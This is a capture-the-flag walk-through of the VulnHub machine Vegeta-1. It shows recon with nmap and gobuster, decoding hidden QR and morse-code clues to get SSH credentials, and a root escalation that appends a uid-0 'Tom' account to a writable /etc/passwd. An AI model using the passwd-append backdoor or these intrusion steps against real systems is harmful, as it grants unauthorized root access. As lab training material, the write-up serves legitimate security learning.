---
title: "Walk-through of Vegeta-1 from VulnHub"
header:
  teaser: /assets/images/2020-07-19-17-33-02.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - VulnHub
  - CTF
  - gobuster
  - qr
  - morse code
  -
---

## Machine Information

![Vegeta-1](/assets/images/2020-07-19-17-33-02.png)

Vegeta-1 is a beginner level Anime themed machine, based around the character [Vegeta from Dragonball](https://dragonball.fandom.com/wiki/Vegeta). It contains numerous rabbit holes, so thorough enumeration and methodically following your leads is important.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [[VulnHub](https://www.vulnhub.com/) |
| Link To Machine | [VulnHub - Easy - Vegeta-1](https://www.vulnhub.com/entry/vegeta-1,501/)) |
| Machine Release Date | 28th June 2020 |
| Date I Completed It | 19th July 2020 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

### Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/vuln/vegeta-1# ports=$(nmap -p- --min-rate=1000 -T4 192.168.0.18 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/vuln/vegeta-1# nmap -p$ports -sC -sV -oA vegeta 192.168.0.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 17:43 BST
Nmap scan report for 192.168.0.18
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:9D:DA:05 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

Just two ports open, let's have a look at port 80:
![vegeta-website](/assets/images/2020-07-19-21-02-54.png)

Nothing here, check for robots.txt:

![website-robots](/assets/images/2020-07-19-21-23-38.png)

A possible clue, let's have a look:

![website-find-me](/assets/images/2020-07-19-21-35-04.png)

We find a file, at first it looks empty, but looking at the source we see this at the end:

![find-me-source](/assets/images/2020-07-19-21-36-09.png)

THe == at the end gives away this is base64 encoded, let's look at it in CyberChef:

![cyberchef-decode](/assets/images/2020-07-19-21-33-19.png)

We see it is a double encoded PNG, save the file and have a look:

![find-me-qr](/assets/images/2020-07-19-21-38-04.png)

We have a QR code, use an online decoder like [zxing](https://zxing.org/w/decode) to see what it gives us:

![zxing-decode-qr](/assets/images/2020-07-19-21-39-05.png)

We have a password, but nowhere yet to use it. Let's try searching for hidden directories:

```text
root@kali:~/vulnhub/vegeta-1# gobuster -t 100 dir -e -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.0.18 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.0.18
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/07/19 21:13:53 Starting gobuster
===============================================================
http://192.168.0.18/login.php (Status: 200)
http://192.168.0.18/img (Status: 301)
http://192.168.0.18/image (Status: 301)
http://192.168.0.18/admin (Status: 301)
http://192.168.0.18/manual (Status: 301)
http://192.168.0.18/server-status (Status: 403)
http://192.168.0.18/bulma (Status: 301)
===============================================================
2020/07/19 21:19:10 Finished
===============================================================
```

We find a file and a few interesting sounding directories, let's have a look:

![website-login.php](/assets/images/2020-07-19-21-22-30.png)

Zero bytes file, nothing here, try the directories:

![website-img-folder](/assets/images/2020-07-19-21-09-09.png)

Just an image here, try the next one:

![website-image-folder](/assets/images/2020-07-19-21-10-28.png)

Nothing here either, try the next one:

![website-admin-folder](/assets/images/2020-07-19-21-18-02.png)

Nothing here, try the next one:

![website-manual-folder](/assets/images/2020-07-19-21-19-33.png)

The last is where I should have started, bulma is a Dragonball character, so another clue:

![website-bulma-folder](/assets/images/2020-07-19-21-42-12.png)

Now we have a wav file, playing it we can tell it is morse code, use decoder to see what it says:

![morse-code-decoder](/assets/images/2020-07-19-21-46-56.png)

We get a user called trunks, with a password u$3r, let's try that SSH port we found earlier:

```text
root@kali:~/vulnhub/vegeta-1# ssh trunks@192.168.0.18
The authenticity of host '192.168.0.18 (192.168.0.18)' can't be established.
ECDSA key fingerprint is SHA256:XL6IZaa/M6erCuxf2qEiDREMhwGWxwoGjo0XfO47bmU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.18' (ECDSA) to the list of known hosts.
trunks@192.168.0.18's password:
Permission denied, please try again.
trunks@192.168.0.18's password:
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 28 21:16:00 2020 from 192.168.43.72
```

At last we have found a way in. One of the first things I do is look in user folder for clues, here we see .bash_history:

```text
trunks@Vegeta:~$ ls -la
drwxr-xr-x 3 trunks trunks 4096 Jun 28 21:32 .
drwxr-xr-x 3 root   root   4096 Jun 28 17:37 ..
-rw------- 1 trunks trunks  382 Jun 28 21:36 .bash_history
-rw-r--r-- 1 trunks trunks  220 Jun 28 17:37 .bash_logout
-rw-r--r-- 1 trunks trunks 3526 Jun 28 17:37 .bashrc
drwxr-xr-x 3 trunks trunks 4096 Jun 28 19:45 .local
-rw-r--r-- 1 trunks trunks  807 Jun 28 17:37 .profile
```

Always worth checking out so we look at the contents:

```text
trunks@Vegeta:~$ cat .bash_history
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ls
su Tom
ls -la
cat .bash_history
sudo apt-get install vim
apt-get install vim
su root
cat .bash_history
exit
```

We see a password being salted the a new user called Tom added. Strange that this is being done by the user. Let's check permission of the passwd file:

```text
trunks@Vegeta:~$ ls -la /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28 21:23 /etc/passwd
```

We have write permissions as user trunks, let's look at the passwd file:

```text
root@Vegeta:/home/trunks# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<<SNIP>>
```

User Tom isn't in passwd, but we can add him be using the line from the history file:

```text
trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

Now we can switch user to Tom using the password Password@973 we found above:

```text
trunks@Vegeta:~$ su Tom
Password: (enter Password@973)
root@Vegeta:/home/trunks# id
uid=0(root) gid=0(root) groups=0(root)
```

Straight to root, nice! We can get the flag now:

```text
root@Vegeta:/home/trunks# ls /root
root.txt
root@Vegeta:/home/trunks# cat /root/root.txt

                               ,   ,'|
                             ,/|.-'   \.
                          .-'  '       |.
                    ,  .-'              |
                   /|,'                 |'
                  / '                    |  ,
                 /                       ,'/
              .  |          _              /
               \`' .-.    ,' `.           |
                \ /   \ /      \          /
                 \|    V        |        |  ,
                  (           ) /.--.   ''"/
                  "b.`. ,' _.ee'' 6)|   ,-'
                    \"= --""  )   ' /.-'
                     \ / `---"   ."|'
  V E G I I T A       \"..-    .'  |.
                       `-__..-','   |
                     _.) ' .-'/    /\.
               .--'/----..--------. _.-""-.
            .-')   \.   /     _..-'     _.-'--.
           / -'/      """""""""         ,'-.   . `.
          | ' /                        /    `   `. \
          |   |                        |         | |
           \ .'\                       |     \     |
          / '  | ,'               . -  \`.    |  / /
         / /   | |                      `/"--. -' /\
        | |     \ \                     /     \     |
         | \      | \                  .-|      |    |

Hurray you got root

Share your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNw
```

All done. See you next time.
